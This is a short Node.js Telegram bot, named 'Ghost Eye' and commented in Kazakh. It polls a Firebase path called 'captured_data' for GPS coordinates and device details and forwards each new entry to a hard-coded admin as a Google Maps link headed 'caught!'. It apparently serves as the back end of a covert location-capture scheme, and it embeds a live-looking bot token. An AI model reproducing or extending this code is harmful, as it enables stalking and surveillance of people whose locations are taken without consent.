const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');

const token = '8673435121:AAE3dl1MLPNc1V7lss4_ygeGmu5eZQXP0bQ';
const adminId = '7594678193';
const fbURL = "https://tulpar-system-default-rtdb.firebaseio.com/captured_data.json";

const bot = new TelegramBot(token, {polling: true});

console.log("Ghost Eye боты іске қосылды...");

setInterval(async () => {
    try {
        const res = await axios.get(fbURL);
        const data = res.data;
        if (data) {
            for (let id in data) {
                if (!data[id].reported) {
                    const msg = "🎯 ТҮСТІ!\n📍 GPS: https://www.google.com/maps?q=" + data[id].lat + "," + data[id].lng + "\n📱 Device: " + data[id].device;
                    bot.sendMessage(adminId, msg);
                    await axios.patch("https://tulpar-system-default-rtdb.firebaseio.com/captured_data/" + id + ".json", {reported: true});
                }
            }
        }
    } catch (e) { }
}, 4000);

bot.onText(/\/start/, (msg) => bot.sendMessage(msg.chat.id, "Ghost System Online. Команда күтілуде..."));
